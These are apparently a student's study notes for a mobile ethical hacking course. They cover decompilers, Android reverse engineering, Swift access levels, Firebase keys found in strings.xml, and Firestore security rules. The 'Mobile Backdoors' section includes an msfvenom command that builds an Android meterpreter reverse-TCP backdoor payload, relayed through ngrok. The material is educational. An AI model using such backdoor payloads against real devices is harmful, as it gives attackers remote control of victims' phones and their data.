# The Complete Mobile Ethical Hacking Course

## Resources
- Lookups / Information
    - https://github.com/ec-council-learning/The-Complete-Mobile-Ethical-Hacking
    - http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html
    - https://quantiti.github.io/dalvik-opcodes/
- Mobile apps
    - https://github.com/atilsamancioglu/MS1-SecureTweet
    - https://github.com/atilsamancioglu/MS2-WordGame
    - https://github.com/atilsamancioglu/MS3-MyReverseApp
    - https://github.com/atilsamancioglu/MS4-DetectJail
    - https://github.com/atilsamancioglu/MS5-DetectJailSwift
    - https://github.com/atilsamancioglu/MS6-QuizGameHacking
- Decompilers
    - https://dedexer.sourceforge.net/
    - https://www.decompiler.com/
    - https://jdec.app/
    - https://dogbolt.org/
    - https://github.com/skylot/jadx
- Software
    - ngrok
    - Cycript - [http://www.cycript.org](http://www.cycript.org)
        - Explore and modify running iOS/Mac OS X applications
    - Charles Web proxy (MitM)
    - GenyMotion - Android emulator in the cloud

## Mobile Backdoors
- Backdoor Android vs iOS
    - Apple App store requires 100$ developer account, but each app is verified before being published
    - Android one can run untrusted software and publish to the app store quite easily
- Payload
    - Generate it with MSFVenom
    - Generates a payload with meterpreter session (or other)
        - `msfvenom -p andoid/meterpreter/reverse_tcp`
        - requires a remote host and port to connect back to
            - This is hosted using ngrok which exposes a web service and forwards the traffic to your host machine

## ROoting and Jailbreaking
- iOS Access Levels
    1. Open / Public
        - Not used, open can be reached and changed from anywhere in the program
        - Public can just be reached
    1. internal
        - Can only be accessed from an instantiated object
    1. fileprivate
        - Can only be reached from the specific source code file
    1. private
        - can only be reached from within the class itself


## Reverse Engineering Android
- apktool - Decompile APK to dex files
- dex - [Dalvik Executable Format](https://source.android.com/docs/core/runtime/dex-format)
    - Used by the Dalvik Virtual Machine
- Jadx - Dex to Java decompiler
- ProGuard - Shrinks and optimizes Java / Kotlin app

## Cloud Hacking - Firebase Security
- File of interest for RE
    - `/res/values/strings.xml` - Shows common strings, eg.
        - `firebase_data_url` - Firebase URL
        - `google_api_key`
        - `google_app_id`
        - `project_id` - used for Firebase database access
        - `google_storage_bucket`
    - The firebase Collection name is found as part of methods interacting with firebase
- FireStore security rules
    - `allow read;` - allows public read
    - `allow write: if request.auth != null;` - Allow authenticated users to perform write actions
    - `allow update;`
    - `allow delete`
    - Functions  
        ```
        match /.... {
            allow read;
            allow write: if isSignedIn();
            allow update: if isSignedIn() && isOwner(useremail);
            allow delete: if isSignedIn() && isOwner(useremail);
        }
        function isSignedIn(){
            return request.auth != null;
        }
        function isOwner(mail){
            return request.auth.uid == mail;
        }
        ```